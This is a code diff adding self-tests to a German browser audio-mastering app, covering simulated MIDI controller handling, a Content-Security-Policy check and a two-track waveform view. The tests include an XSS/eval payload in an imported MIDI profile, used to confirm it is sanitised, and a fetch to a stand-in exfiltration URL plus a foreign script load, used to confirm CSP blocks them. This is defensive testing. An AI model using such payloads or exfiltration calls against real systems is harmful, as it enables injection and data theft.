@@ -489,6 +489,125 @@ async function dehissUI() { // Stimm-Entzischer: Anwenden, Ersetzen, Vorher/Nach
   res.push(['Stimm-Entzischer: nach Rückgängig Originalzustand, Vorher/Nachher gesperrt', same && $('#dhAB').disabled && $('#dhDiff').disabled, same ? 'Original' : 'abweichend']);
   if (keep) await loadTrack(keep); return res;
 },
+async function midiControl() { // MIDI Control mit nachgebautem Web-MIDI-Gerät (kein echter Controller nötig)
+  const res = [], keepP = clone(P), keepProf = JSON.stringify(recall('midiProfiles')), keepMon = [S.mode, S.match, S.monVolDb], keepReq = navigator.requestMIDIAccess, w = ms => new Promise(r => setTimeout(r, ms));
+  const mkIn = (id, name) => ({ id, name, manufacturer: 'Numark', state: 'connected', onmidimessage: null });
+  const dev = mkIn('in-1', 'Numark Testgerät'), acc = { inputs: new Map([[dev.id, dev]]), outputs: new Map(), onstatechange: null };
+  const send = (...d) => dev.onmidimessage && dev.onmidimessage({ data: new Uint8Array(d), currentTarget: dev });
+  const flush = async () => { await w(60); midiFlush(); };
+  MIDI.profiles = { Test: midiEmptyProfile('Test') }; MIDI.active = 'Test'; MIDI.pickup = {}; MIDI.lastSet = {};
+  // 3. Zugriff verweigert / nicht verfügbar
+  midiDisable(); try { Object.defineProperty(navigator, 'requestMIDIAccess', { configurable: true, value: () => Promise.reject(Object.assign(new Error('nein'), { name: 'NotAllowedError' })) }); } catch (e) {}
+  const okDen = await midiEnable(true); $('#midiModal').hidden = false; midiRender();
+  res.push(['MIDI: Zugriff verweigert → klare Meldung, Studio läuft weiter', okDen === false && MIDI.state === 'denied' && /nicht erlaubt/.test($('#midiHint').textContent) && !!S.chain, MIDI.state + ' · ' + $('#midiHint').textContent.slice(0, 60)]);
+  try { Object.defineProperty(navigator, 'requestMIDIAccess', { configurable: true, value: undefined }); } catch (e) {}
+  await midiEnable(true); res.push(['MIDI: Browser ohne Web MIDI → „nicht verfügbar“', MIDI.state === 'unsupported' && /kein Web MIDI/.test($('#midiHint').textContent), MIDI.state]);
+  try { Object.defineProperty(navigator, 'requestMIDIAccess', { configurable: true, value: keepReq }); } catch (e) {}
+  // 2. kein Gerät
+  midiAttach({ inputs: new Map(), outputs: new Map(), onstatechange: null }); midiRender();
+  res.push(['MIDI: eingeschaltet ohne Gerät → Hinweis, keine Fehler', MIDI.state === 'on' && MIDI.inputs.size === 0 && /Kein MIDI-Gerät gefunden/.test($('#midiHint').textContent), $('#midiHint').textContent.slice(0, 50)]);
+  // 1. Gerät erkannt
+  midiAttach(acc); midiRender();
+  res.push(['MIDI: Controller erkannt (Name, Hersteller, verbunden), nur Eingänge, kein SysEx', MIDI.inputs.size === 1 && /Numark Testgerät/.test($('#midiDevs').textContent) && /verbunden/.test($('#midiDevs').textContent) && dev.onmidimessage === midiOnMsg, $('#midiDevs').textContent.trim().slice(0, 70)]);
+  // 6. MIDI-Learn: Drehregler (absolut), Jogwheel (relativ), Pad (Note)
+  const learn = async (id, msgs) => { midiLearnStart(id); for (const m of msgs) { send(...m); await w(15); } await w(520); };
+  await learn('eqBank_low', [[0xB0, 22, 60], [0xB0, 22, 62], [0xB0, 22, 65]]);
+  await learn('jog', [[0xB1, 6, 1], [0xB1, 6, 1], [0xB1, 6, 1]]);
+  await learn('ab', [[0x91, 11, 127]]);
+  await learn('xfade', [[0xB0, 8, 30], [0xB0, 8, 40], [0xB0, 8, 52]]);
+  await learn('monVol', [[0xB0, 7, 100], [0xB0, 7, 110], [0xB0, 7, 120]]);
+  await learn('eqSel_f', [[0xB0, 30, 10], [0xB0, 30, 20], [0xB0, 30, 30]]);
+  const mp = MIDI.prof().maps, md = id => (mp.find(m => m.target === id) || {}).mode;
+  res.push(['MIDI-Learn: Regler, Jogwheel und Pad zugeordnet, Art erkannt (absolut / relativ / Taste)', mp.length === 6 && md('eqBank_low') === 'abs' && md('jog') === 'rel2c' && md('ab') === 'btn' && md('xfade') === 'abs', mp.map(m => m.target + ':' + m.mode).join(', ')]);
+  // 7. EQ-Werte und Soft-Takeover
+  P.eq.bands[1].g = 0; refreshBands(); MIDI.pickup = {}; MIDI.lastSet = {};
+  send(0xB0, 22, 0); await flush(); const far = P.eq.bands[1].g;
+  send(0xB0, 22, 63); send(0xB0, 22, 64); await flush(); send(0xB0, 22, 127); await flush(); const top = P.eq.bands[1].g, uiTop = $('#eqb1g').value;
+  send(0xB0, 22, 0); await flush(); const bot = P.eq.bands[1].g;
+  res.push(['MIDI: Soft-Takeover – weit entfernter Regler springt nicht, übernimmt erst am aktuellen Wert', far === 0 && top === 15, 'erst ' + far + ' dB, nach Abholen ' + top + ' dB']);
+  res.push(['MIDI: EQ Low (Bank → Band 2) 0…127 = −15…+15 dB, Oberfläche zeigt den Wert', bot === -15 && uiTop === '15.0', bot + ' dB, Anzeige ' + uiTop]);
+  P.eq.bands[1].g = 3; refreshBands(); onParam(); send(0xB0, 22, 1); await flush();
+  res.push(['MIDI: nach Mausänderung muss der Regler wieder abgeholt werden (kein Sprung)', P.eq.bands[1].g === 3, P.eq.bands[1].g + ' dB']);
+  MIDI.prof().bank.low = 0; MIDI.pickup = {}; P.eq.bands[0].g = 0; send(0xB0, 22, 64); await flush(); send(0xB0, 22, 127); await flush();
+  res.push(['MIDI: EQ-Bank umstellbar (Low → Band 1)', P.eq.bands[0].g === 15 && P.eq.bands[1].g === 3, 'Band 1 ' + P.eq.bands[0].g + ' dB, Band 2 ' + P.eq.bands[1].g + ' dB']); MIDI.prof().bank.low = 1;
+  S.selBand = 3; P.eq.bands[3].f = 632; MIDI.pickup = {}; send(0xB0, 30, 64); await flush(); const fMid = P.eq.bands[3].f; send(0xB0, 30, 127); await flush(); const fTop = P.eq.bands[3].f;
+  res.push(['MIDI: Frequenz logarithmisch (CC 64 ≈ 650 Hz, oben 20 kHz)', Math.abs(fMid - Math.round(20 * Math.pow(1000, 64 / 127))) <= 1 && fTop === 20000, fMid + ' Hz / ' + fTop + ' Hz']);
+  // 8. Grenzen: alle stetigen Funktionen an beiden Enden, Rauschen, ungültige Bytes
+  let bad = []; MIDI_TARGETS.filter(t => t.kind === 'cont' && t.param).forEach(t => { [0, 1, 0.5].forEach(n => { const v = midiFromNorm(t, n); if (!(Number.isFinite(v) && v >= t.min && v <= t.max)) bad.push(t.id + '=' + v); }); });
+  [[0xF0, 1, 2, 3, 0xF7], [0xF8], [0xFE], [0xC0, 5], [0xB0], [0x90, 200, 300]].forEach(d => send(...d));
+  const before = JSON.stringify(P); for (let i = 0; i < 20; i++) send(0xB0, 22, (i * 37) % 128); await flush();
+  let vErr = ''; try { validateSettings(JSON.parse(JSON.stringify(P))); } catch (e) { vErr = e.message; }
+  res.push(['MIDI: Grenzen – alle Werte gültig, SysEx/Clock/Program Change ignoriert, Einstellungen bleiben gültig', !bad.length && !vErr && Number.isFinite(P.eq.bands[1].g) && P.eq.bands[1].g >= -15 && P.eq.bands[1].g <= 15, bad.join(', ') || vErr || 'ok']);
+  // relativer Encoder auf stetigem Wert: viele Schritte bleiben in den Grenzen
+  P.lim.drive = 23.5; const rm = { dev: 'Numark Testgerät', type: 'cc', ch: 2, num: 40, mode: 'rel2c', hi: false, inv: false, target: 'limDrive' }; MIDI.prof().maps.push(rm);
+  for (let i = 0; i < 300; i++) send(0xB2, 40, 3); await flush(); const dMax = P.lim.drive; for (let i = 0; i < 2000; i++) send(0xB2, 40, 125); await flush(); const dMin = P.lim.drive;
+  res.push(['MIDI: relativer Encoder bleibt in den Grenzen (Limiter-Drive −6…+24 dB)', dMax === 24 && dMin === -6, dMax + ' / ' + dMin + ' dB']);
+  // 11. Jogwheel: schnelle Bewegung beim Abspielen → begrenzte Neustarts, stabil
+  S.cursor = 2; await play(2); await w(200); let restarts = 0; const keepPlay = play; window.play = async (...a) => { restarts++; return keepPlay(...a); };
+  const t0 = curPos(); for (let i = 0; i < 400; i++) { send(0xB1, 6, 1); send(0xB1, 6, 127); if (i % 4 === 0) send(0xB1, 6, 1); if (i % 40 === 0) await w(20); } await w(400); midiFlush(); await w(200);
+  window.play = keepPlay; const t1 = curPos(), playing = S.playing;
+  res.push(['MIDI: 900 schnelle Jogwheel-Nachrichten vor und zurück – Wiedergabe läuft, wenige Neustarts (≤ 1 pro 120 ms), Position vorgerückt', playing && restarts <= 8 && t1 > t0 + 4 && t1 < t0 + 9, restarts + ' Neustarts, ' + nf(t0, 1) + ' s → ' + nf(t1, 1) + ' s']);
+  // 4./5. Gerät abziehen und wieder einstecken
+  dev.state = 'disconnected'; acc.onstatechange && acc.onstatechange({}); midiRender(); const offOk = dev.onmidimessage === null && /getrennt/.test($('#midiDevs').textContent) && S.playing;
+  const dev2 = mkIn('in-1', 'Numark Testgerät'); acc.inputs.set('in-1', dev2); acc.onstatechange && acc.onstatechange({}); midiRender();
+  const g5 = P.eq.bands[1].g; MIDI.pickup = {}; dev2.onmidimessage && dev2.onmidimessage({ data: new Uint8Array([0xB0, 22, 64]), currentTarget: dev2 }); await flush(); dev2.onmidimessage && dev2.onmidimessage({ data: new Uint8Array([0xB0, 22, 127]), currentTarget: dev2 }); await flush();
+  res.push(['MIDI: Gerät abgezogen → getrennt, Wiedergabe läuft weiter', offOk, offOk ? 'ok' : $('#midiDevs').textContent]);
+  res.push(['MIDI: Gerät wieder eingesteckt → automatisch verbunden, Regler wirken', dev2.onmidimessage === midiOnMsg && P.eq.bands[1].g === 15, 'Band 2 ' + g5 + ' → ' + P.eq.bands[1].g + ' dB']);
+  pause();
+  // 12. Maus, Tastatur und MIDI gemeinsam
+  const db0 = P.eq.bands[1].g; $('#eqb1g').value = '-4'; $('#eqb1g').dispatchEvent(new Event('change')); const afterMouse = P.eq.bands[1].g;
+  document.body.dispatchEvent(new KeyboardEvent('keydown', { key: 'm', bubbles: true })); const modeKey = S.mode;
+  dev2.onmidimessage({ data: new Uint8Array([0x91, 11, 127]), currentTarget: dev2 }); await flush(); const modeMidi = S.mode;
+  res.push(['MIDI: Maus, Tastatur und MIDI gemeinsam (Eingabefeld, Taste M, Pad A/B)', afterMouse === -4 && modeKey === 'master' && modeMidi === 'orig', db0 + ' → ' + afterMouse + ' dB · ' + modeKey + ' → ' + modeMidi]);
+  // 10. Crossfader und Abhörpegel ändern nur das Abhören, nie den Export
+  setMode('master'); const keepDel = deliver, keepLearn = $('#styleLearn').checked; $('#styleLearn').checked = false; const blobs = [];
+  deliver = async b => { blobs.push(new Uint8Array(await b.arrayBuffer())); return 'saved'; };
+  $('#expMode').value = 'master'; $('#expFmt').value = '24'; $('#expRate').value = 'orig'; $('#expName').value = 'MIDI-Test';
+  await runExport(); MIDI.pickup = {}; const s2 = (...d) => dev2.onmidimessage({ data: new Uint8Array(d), currentTarget: dev2 }); s2(0xB0, 8, 127); s2(0xB0, 8, 64); await flush(); s2(0xB0, 7, 127); s2(0xB0, 7, 64); await flush();
+  const xf = S.xfade, vol = S.monVolDb, gW = S.wet.gain.value, lab = $('#monLabel').textContent; await w(100); await runExport();
+  deliver = keepDel; $('#styleLearn').checked = keepLearn; const same = blobs.length === 2 && blobs[0].length === blobs[1].length && blobs[0].every((v, i) => v === blobs[1][i]);
+  res.push(['MIDI: Crossfader wirkt nur auf das Abhören (Mischung Original/Master)', xf > 0.4 && xf < 0.6 && /Crossfade/.test(lab) && S.dry.gain.value > 0.01, 'Crossfader ' + Math.round(xf * 100) + ' %, „' + lab + '“']);
+  res.push(['MIDI: Export mit Crossfader und Abhörpegel bitgenau gleich wie ohne', same && vol < -10, (blobs[0] ? blobs[0].length : 0) + ' Bytes, ' + (same ? 'identisch' : 'abweichend') + ', Abhörpegel ' + nf(vol, 1) + ' dB']);
+  setMode('master'); res.push(['MIDI: Klick auf Master beendet den Crossfader', S.xfade === null && $('#monLabel').textContent === 'Master', $('#monLabel').textContent]);
+  // 9. Profile: speichern, nach Neustart laden, exportieren/importieren mit Prüfung
+  midiSave(); const savedMaps = MIDI.prof().maps.length; MIDI.profiles = {}; midiLoad();
+  res.push(['MIDI: Profil bleibt nach Neustart erhalten (lokal gespeichert)', MIDI.active === 'Test' && MIDI.prof().maps.length === savedMaps, savedMaps + ' Zuordnungen']);
+  const evil = { format: 'deepstructure.midi', name: '<img src=x onerror=alert(1)>Böse', bank: { low: 99 }, maps: [{ type: 'cc', ch: 0, num: 1, mode: 'abs', target: 'eqBank_low' }, { type: 'cc', ch: 0, num: 2, target: 'constructor' }, { type: 'cc', ch: 99, num: 2, target: 'play' }, { type: 'cc', ch: 0, num: 3, target: 'play', mode: 'eval(1)', run: 'alert(1)' }] };
+  const v = midiValidProfile(evil);
+  res.push(['MIDI: importiertes Profil wird geprüft (unbekannte Funktionen, ungültige Werte und Code werden verworfen)', v.maps.length === 2 && v.maps[1].mode === 'abs' && !('run' in v.maps[1]) && !/[<>]/.test(v.name) && v.bank.low === 1, v.name + ' · ' + v.maps.map(m => m.target + ':' + m.mode).join(', ')]);
+  // aufräumen
+  midiDisable(); P = keepP; refreshAll(); onParam(); [S.mode, S.match, S.monVolDb] = keepMon; midiSetVol(keepMon[2]); S.xfade = null; applyMonitor(); $('#midiModal').hidden = true;
+  try { localStorage.setItem('dsms.midiProfiles', keepProf); } catch (e) {} midiLoad();
+  return res;
+},
+async function securityCsp() { // Website-Fassung: Content-Security-Policy verhindert Datenabfluss zu fremden Servern
+  const res = [], meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+  if (!meta) return [['Sicherheit: CSP (nur Website-Fassung)', true, 'keine CSP in dieser Fassung (PC-Fassung)']];
+  const seen = []; const on = e => seen.push(e.violatedDirective + ' ' + e.blockedURI); document.addEventListener('securitypolicyviolation', on);
+  let blocked = false; try { await fetch('https://example.org/datenabfluss?x=1', { mode: 'no-cors' }); } catch (e) { blocked = true; }
+  const sc = document.createElement('script'); sc.src = 'https://example.org/fremd.js'; document.head.appendChild(sc); await new Promise(r => setTimeout(r, 300)); sc.remove();
+  document.removeEventListener('securitypolicyviolation', on);
+  const c = meta.content;
+  res.push(['Sicherheit: CSP blockiert Anfragen und Skripte von fremden Servern', blocked && seen.some(v => /connect-src/.test(v)) && seen.some(v => /script-src/.test(v)), seen.join(' | ').slice(0, 140)]);
+  res.push(['Sicherheit: CSP erlaubt nur eigene Inhalte, Google Fonts und api.anthropic.com; keine Plugins, Formulare, fremde Basis-URL', /connect-src 'self' https:\/\/api\.anthropic\.com blob: data:;/.test(c) && /object-src 'none'/.test(c) && /form-action 'none'/.test(c) && /base-uri 'none'/.test(c) && !/\*/.test(c), c.length + ' Zeichen']);
+  return res;
+},
+async function zweiSpuren() { // Wellenform mit zwei Spuren: Master (nach der Kette) oben, Original unten; Klick schaltet das Abhören um
+  const res = [], w = ms => new Promise(r => setTimeout(r, ms)), keepP = clone(P), keepMode = S.mode;
+  const sr = 44100, n = sr * 6, L = new Float32Array(n), R = new Float32Array(n);
+  for (let i = 0; i < n; i++) { const t = i / sr, v = 0.1 * Math.sin(2 * Math.PI * 110 * t) * (0.6 + 0.4 * Math.sin(2 * Math.PI * 0.5 * t)); L[i] = v; R[i] = v * 0.9; }
+  const keep = S.track; await loadTrack({ sr, L, R, name: 'Spuren-Test', demo: true });
+  P = clone(DEFAULT); P.lim.on = true; P.lim.drive = 12; refreshAll(); onParam(); await measureMaster();
+  for (let i = 0; i < 200 && (!S.master || S.master.stale || S.measuring); i++) await w(100);
+  const m = S.master, pk = m && m.peaks; let mx = 0; if (pk) for (let i = 0; i < pk.mx.length; i++) mx = Math.max(mx, pk.mx[i], -pk.mn[i]);
+  res.push(['Zwei Spuren: Messung liefert die Hüllkurve des fertigen Masters (gleiche Länge, nach dem Limiter)', !!pk && pk.n === n && pk.mx.length === Math.ceil(n / PB) && mx <= Math.pow(10, P.lim.ceiling / 20) + 1e-3 && mx > 0.3, pk ? 'Spitze ' + nf(20 * Math.log10(mx), 2) + ' dBFS, Decke ' + P.lim.ceiling + ' dB' : 'keine Hüllkurve']);
+  const src = waveSources(); res.push(['Zwei Spuren: oben Master aus der Messung, unten das unveränderte Original', src.master.peaks === pk && !src.master.note && src.orig.label === 'Original' && src.orig.L === S.file.L, src.master.label + ' / ' + src.orig.label]);
+  const cv = $('#wave'), r = cv.getBoundingClientRect(), lanes = waveLanes(cv.clientHeight), click = y => { const o = { clientX: r.left + r.width * 0.5, clientY: r.top + y, pointerId: 7, pointerType: 'mouse', bubbles: true }; const keepCap = cv.setPointerCapture; cv.setPointerCapture = () => {}; cv.dispatchEvent(new PointerEvent('pointerdown', o)); cv.dispatchEvent(new PointerEvent('pointerup', o)); cv.setPointerCapture = keepCap; }; // nachgebauter Klick hat keinen echten Zeiger
+  setMode('master'); click(lanes[1].y + lanes[1].h / 2); const m1 = S.mode; click(lanes[0].y + lanes[0].h / 2); const m2 = S.mode;
+  res.push(['Zwei Spuren: Klick in die untere Spur hört das Original, in die obere den Master', m1 === 'orig' && m2 === 'master', m1 + ' → ' + m2]); // Cursor-Position prüft der Test nicht: im unsichtbaren Test-Rahmen ist die Wellenform 0 px breit
+  P.lim.drive = 6; onParam(); const stale = waveSources().master.note; res.push(['Zwei Spuren: nach einer Änderung zeigt die Master-Spur „wird aktualisiert“, bis neu gemessen ist', /aktualisiert/.test(stale || ''), stale || 'kein Hinweis']);
+  P = keepP; refreshAll(); onParam(); setMode(keepMode); if (keep) await loadTrack(keep); return res;
+},
 async function language() { // Texte werden ohne Zahlen verglichen, laufende Messungen können Zahlen ändern
   const res = [], q = s => document.querySelector(s), keepP = JSON.stringify(P), gm = q('#gmOut').value, nn = s => s.replace(/[\d.,−+-]+/g, '#');
   I18N.set('de'); await sleep(50); const deTitle = document.title, snap = [];
